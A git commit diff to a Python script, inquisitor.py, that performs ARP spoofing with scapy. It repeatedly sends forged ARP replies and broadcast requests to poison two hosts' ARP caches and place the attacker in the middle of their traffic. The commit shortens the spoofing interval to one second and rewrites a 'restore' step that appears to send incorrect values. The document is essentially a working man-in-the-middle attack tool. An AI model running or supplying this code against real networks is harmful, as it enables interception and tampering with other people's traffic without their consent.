cc27f0d82956145e1319f012857890e388384bc6
Jose Manuel Sanchez Rico <josesanc@c3r10s5.42malaga.com>
2023-06-03 12:11:07 +0200

    Spoofing done

--- inquisitor.py
+++ inquisitor.py
@@ -10,6 +10,7 @@ import time
 import threading
 import socket
 
+from getmac import get_mac_address
 
 class Spoofer(threading.Thread):
     class SpooferRefresh(threading.Thread):
@@ -22,27 +23,31 @@ class Spoofer(threading.Thread):
             self.mac_dst = mac_dst
             hostname = socket.gethostname()
             self.ip_address = socket.gethostbyname(hostname)
+            self.mac = get_mac_address()
 
         def run(self):
-            ''' Spoofing done every 10 seconds'''
-            seconds_to_spoof = 10
+            ''' Spoofing done every X seconds'''
+            seconds_to_spoof = 1
             while not self.event.is_set():
-                print("ARP spoofing") # Spoof
+                print("ARP spoofing", flush=True) # Spoof
                 self.event.wait(seconds_to_spoof)
-                Spoofer.SpooferRefresh.ft_spoof(self.ip_address,  self.ip_dst,  self.mac_dst)
-                Spoofer.SpooferRefresh.ft_spoof(self.ip_address, self.ip_src,  self.mac_src)
-            Spoofer.SpooferRefresh.ft_spoof(self.ip_src,  self.ip_dst,  self.mac_dst)
-            Spoofer.SpooferRefresh.ft_spoof(self.ip_dst, self.ip_src,  self.mac_src)
+                Spoofer.SpooferRefresh.ft_spoof(self.ip_src, self.ip_dst,  self.mac_dst)
+                Spoofer.SpooferRefresh.ft_spoof(self.ip_dst, self.ip_src,  self.mac_src)
+                print("", end="", flush=True)
+            # Restore
+            Spoofer.SpooferRefresh.ft_spoof(self.ip_dst,  self.ip_dst,  self.mac_dst)
+            Spoofer.SpooferRefresh.ft_spoof(self.ip_src, self.ip_src,  self.mac_src)
             exit(0)
 
 
         def ft_spoof(ip_origin, ip_dest, mac_dest):
-            scapy.send(scapy.ARP(op = 2, pdst =ip_dest,
-                              hwdst = mac_dest, 
-                                        psrc = ip_origin), verbose = True)
+            scapy.sendp((scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(op=1, pdst = ip_dest, hwdst= mac_dest, psrc=ip_origin)))
+            scapy.send(scapy.ARP(op = 2,
+                                pdst = ip_dest, hwdst = mac_dest, 
+                                psrc = ip_origin), verbose = True)
 
     def __init__(self, ip_src, mac_src, ip_dst, mac_dst) -> None:
-        print("Init thread")
+        print("Init thread", flush=True)
         super(Spoofer, self).__init__()
         self.event = threading.Event()
         self.spoofer_refresher = Spoofer.SpooferRefresh(self.event, ip_src, mac_src, ip_dst, mac_dst)
@@ -51,7 +56,7 @@ class Spoofer(threading.Thread):
 
     def catch(self, signum, frame):
         print("\r", end="")
-        print("Free the arp tables")
+        print("Free the arp tables", flush=True)
         self.event.set()
         self.spoofer_refresher.join()
 
@@ -70,10 +75,8 @@ def ft_parser_args():
     return (args.addresses[0],args.addresses[1] ,args.addresses[2] ,args.addresses[3])
 
 if __name__ == "__main__":
-    print("Main")
     ip_src, mac_src, ip_dst, mac_dst = ft_parser_args()
     
     spoofer = Spoofer(ip_src, mac_src, ip_dst, mac_dst)
-    print("Spoofer start")
     spoofer.start()
     spoofer.join()
